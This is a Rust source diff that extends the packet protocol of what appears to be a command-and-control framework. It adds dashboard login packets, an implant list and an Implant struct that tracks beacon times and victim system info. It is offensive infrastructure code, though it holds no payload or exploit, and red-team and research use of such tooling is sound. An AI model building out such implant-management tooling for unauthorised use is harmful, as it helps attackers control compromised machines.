@@ -1,4 +1,4 @@
-use std::ops::Range;
+use std::{ops::Range, time::SystemTime};
 
 use bincode::{Decode, Encode, config};
 use sysinfo::System;
@@ -14,6 +14,27 @@ pub const MAX_PACKET_SIZE_BYTES: usize = 1024;
 #[derive(Debug, Encode, Decode)]
 pub enum Packet {
     Beacon { system_info: SystemInfo },
+    DashboardLogin { password: String },
+    LoginSuccess,
+    LoginFailed,
+    ImplantListRequest,
+    ImplantList(Vec<Implant>),
+    C2Alive,
+}
+
+#[derive(Debug, Clone, Encode, Decode)]
+pub struct Implant {
+    pub last_beacon_timestamp: SystemTime,
+    pub system_info: SystemInfo,
+}
+
+impl Implant {
+    pub fn new(system_info: SystemInfo) -> Self {
+        Self {
+            last_beacon_timestamp: SystemTime::now(),
+            system_info,
+        }
+    }
 }
 
 #[derive(Debug)]
@@ -22,7 +43,7 @@ pub enum PacketSerializationError {
     EncodingError(bincode::error::EncodeError),
 }
 
-pub fn encode(packet: &Packet) -> Result<Vec<u8>, PacketSerializationError> {
+pub fn encode(packet: Packet) -> Result<Vec<u8>, PacketSerializationError> {
     let bytes = bincode::encode_to_vec(packet, config::standard());
     match bytes {
         Ok(bytes) => {
